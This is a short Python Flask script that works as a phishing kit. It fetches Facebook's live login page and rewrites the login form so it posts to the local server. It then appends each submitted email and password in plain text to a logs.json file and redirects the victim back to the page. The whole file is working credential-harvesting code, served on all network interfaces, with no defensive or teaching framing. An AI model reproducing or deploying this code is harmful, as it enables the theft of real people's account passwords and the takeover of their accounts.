from flask import Flask, request, render_template, redirect
from bs4 import BeautifulSoup
import requests, json

app = Flask(__name__)
port = 3000
host = "0.0.0.0"

@app.route("/")
def main():
    url = "https://www.facebook.com/"
    response = requests.get(url)
    original = "./original.html"
    with open(original, "w", encoding="utf-8") as file:
        file.write(response.text)
        
    modified = "./templates/index.html"
    with open(original, "r", encoding="utf-8") as file:
        soup = BeautifulSoup(file.read(), "lxml")
        form = soup.find("form")
        form["action"] = "http://localhost:3000/login"
        form["method"] = "post"
        form["enctype"] = "multipart/form-data"
        del form["class"]
        del form["id"]
        del form["onsubmit"]
        del form["data-testid"]
        with open(modified, "w", encoding="utf-8") as file:
            file.write(soup.prettify())
            return render_template("index.html")
        
@app.route("/login", methods=["POST"])
def login():
    email = request.form["email"]
    password = request.form["pass"]
    
    logs = "./logs.json"
    with open(logs, "r", encoding="utf-8") as file:
        load = json.load(file)
        load.append({
            "email": email,
            "password": password  
        })
        dumps = json.dumps(load, indent=4)
        
        with open(logs, "w", encoding="utf-8") as file:
            file.write(dumps)
    
    return redirect("/")

if __name__ == "__main__":
    app.run(host=host, port=port)